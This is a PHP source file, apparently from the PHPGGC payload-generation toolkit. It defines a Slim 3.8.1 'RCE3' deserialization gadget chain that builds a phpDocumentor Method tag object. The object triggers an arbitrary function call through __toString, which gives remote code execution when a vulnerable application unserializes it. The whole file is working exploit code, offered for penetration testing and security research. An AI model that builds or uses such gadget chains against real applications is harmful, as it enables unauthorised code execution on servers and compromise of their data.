<?php

namespace GadgetChain\Slim;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.8.1';
    public static $vector = '__toString';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \phpDocumentor\Reflection\DocBlock\Tags\Method($function, $parameter);
    }
}